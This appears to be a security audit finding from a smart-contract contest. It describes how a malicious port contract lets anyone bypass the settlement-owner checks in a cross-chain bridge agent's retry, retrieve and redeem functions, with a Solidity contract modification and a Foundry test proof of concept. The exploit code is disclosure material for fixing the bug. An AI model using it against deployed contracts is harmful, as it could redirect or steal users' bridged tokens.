# Vulnerability details

## Impact

An attacker can bypass the checks in `retrySettlement`, `retrieveSettlement` and `redeemSettlement` using a custom `localPortAddress`. In these functions, there is a check to determine if the  `msg.sender` is the owner of the settlement. 
```solidity
// Check Settlement Owner
        if (msg.sender != settlementOwner) {
            if (msg.sender != address(IPort(localPortAddress).getUserAccount(settlementOwner))) {
                revert NotSettlementOwner();
            }
```

This can be bypassed by using a custom `localPortAddress` provided while creating a new `RootBranchBridgeAgent` since anyone can create a `RootBranchBridgeAgent`.

## Proof of Concept

The attack can be depicted as follows:

1. Alice creates a malicious port contract that is similar to the [RootPort.sol](https://github.com/code-423n4/2023-09-maia/blob/main/src/RootPort.sol). Only difference being changing the `fetchVirtual()` function [here](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/RootPort.sol#L350C5-L353C6) to:

```solidity
 address Alice = address(0xFFFF); // This is address of Alice.

   /// @inheritdoc IRootPort
    function fetchVirtualAccount(address _user) external override returns (VirtualAccount account) {
        account = getUserAccount[_user];
        if (address(account) == address(0)) account = addVirtualAccount(Alice);//@audit interesting...
    }
```
2. Now Alice can call `retrySettlement`, `retrieveSettlement` Or `redeemSettlement` while bypassing the check in those functions.

This is depicted using this Coded PoC. Note that this is a modified version of already existing `testRetrySettlement()` in test/ulysses-omnichain/RootTest.t.sol. So you only need to import the 'Modified' port contract with the above modification and use it.

The already existing test has a lot of comments, feel free to comment those out for readability.

```solidity
 function testRetrySettlement() public {
        // Set up
        testAddLocalTokenArbitrum();

        // Prepare data
        bytes memory packedData;

        {
            Multicall2.Call[] memory calls = new Multicall2.Call[](1);

            // Mock Omnichain dApp call
            calls[0] = Multicall2.Call({
                target: newAvaxAssetGlobalAddress,
                callData: abi.encodeWithSelector(bytes4(0xa9059cbb), mockApp, 0 ether)
            });

            // Output Params
            OutputParams memory outputParams = OutputParams(address(this), newAvaxAssetGlobalAddress, 150 ether, 0);

            // RLP Encode Calldata Call with no gas to bridge out and we top up.
            bytes memory data = abi.encode(calls, outputParams, avaxChainId);

            // Pack FuncId
            packedData = abi.encodePacked(bytes1(0x02), data);
        }

        address _user = address(this);

        // Get some gas.
        hevm.deal(_user, 1 ether);

        // Assure there is enough balance for mock action
        hevm.prank(address(rootPort));
        ERC20hTokenRoot(newAvaxAssetGlobalAddress).mint(address(rootPort), 50 ether, rootChainId);
        hevm.prank(address(avaxPort));
        ERC20hTokenBranch(avaxMockAssethToken).mint(_user, 50 ether);

        // Mint Underlying Token.
        avaxMockAssetToken.mint(_user, 100 ether);

        // Prepare deposit info
        DepositInput memory depositInput = DepositInput({
            hToken: address(avaxMockAssethToken),
            token: address(avaxMockAssetToken),
            amount: 150 ether,
            deposit: 100 ether
        });

        hevm.deal(address(multicallBridgeAgent), 1 ether);

        address Alice = address(0xFFFF);

        console2.log("BALANCE BEFORE:");
        console2.log("User avaxMockAssetToken Balance:", MockERC20(avaxMockAssetToken).balanceOf(_user));
        console2.log("User avaxMockAssethToken Balance:", MockERC20(avaxMockAssethToken).balanceOf(_user));
        console2.log("Balance of RootBridgeAent:", address(multicallBridgeAgent).balance);
        console2.log("Balance of USER:", _user.balance);
        console2.log("Alice avaxMockAssetToken Balance:", MockERC20(avaxMockAssetToken).balanceOf(Alice));
        console2.log("Alice avaxMockAssethToken Balance:", MockERC20(avaxMockAssethToken).balanceOf(Alice));

        //Set MockEndpoint _fallback mode ON
        MockEndpoint(lzEndpointAddress).toggleFallback(1);

        //GasParams
        GasParams memory gasParams = GasParams(0.5 ether, 0.5 ether);

        // Call Deposit function
        avaxMockAssetToken.approve(address(avaxPort), 100 ether);
        ERC20hTokenRoot(avaxMockAssethToken).approve(address(avaxPort), 50 ether);
        avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 1 ether}(
            payable(address(this)), packedData, depositInput, gasParams, false
        );

        //Set MockEndpoint _fallback mode OFF
        MockEndpoint(lzEndpointAddress).toggleFallback(0);

        uint32 settlementNonce = multicallBridgeAgent.settlementNonce() - 1;

        Settlement memory settlement = multicallBridgeAgent.getSettlementEntry(settlementNonce);

        require(settlement.status == STATUS_SUCCESS, "Settlement status should be success.");

        // Get some gas.
        hevm.deal(Alice, 100 ether);

        //Retry Settlement

        //Note that ALice is calling the function while _user is the owner of the settlement.

        hevm.prank(Alice);
        multicallBridgeAgent.retrySettlement{value: 1 ether}(
            settlementNonce, address(this), "", GasParams(0.5 ether, 0.5 ether), true
        );

        settlement = multicallBridgeAgent.getSettlementEntry(settlementNonce);

        console2.log("BALANCE AFTER:");
        console2.log("User avaxMockAssetToken Balance:", MockERC20(avaxMockAssetToken).balanceOf(_user));
        console2.log("User avaxMockAssethToken Balance:", MockERC20(avaxMockAssethToken).balanceOf(_user));
        console2.log("Balance of RootBridgeAgent:", address(multicallBridgeAgent).balance);
        console2.log("Balance of USER:", _user.balance);
        console2.log("User avaxMockAssetToken Balance:", MockERC20(avaxMockAssetToken).balanceOf(Alice));
        console2.log("User avaxMockAssethToken Balance:", MockERC20(avaxMockAssethToken).balanceOf(Alice));

        require(settlement.status == STATUS_SUCCESS, "Settlement status should be success.");

        require(avaxMulticallBridgeAgent.executionState(settlementNonce) == 1, "Settelement Executed in branch");
    }
``` 

This can be reproduced with the other functions such as `retrieveSettlement` and `redeemSettlement`.

As we can see in the PoC, the tokens are not stolen by the attacker `retrieveSettlement` and `retrySettlement` the malicious party can bypass those checks, settlements can be falsely redeemed back to the user, but in `redeemSettlement`, `msg.sender` is passed as recipient when calling `bridgeToRoot` . So tokens will be transferred to the attacker. 


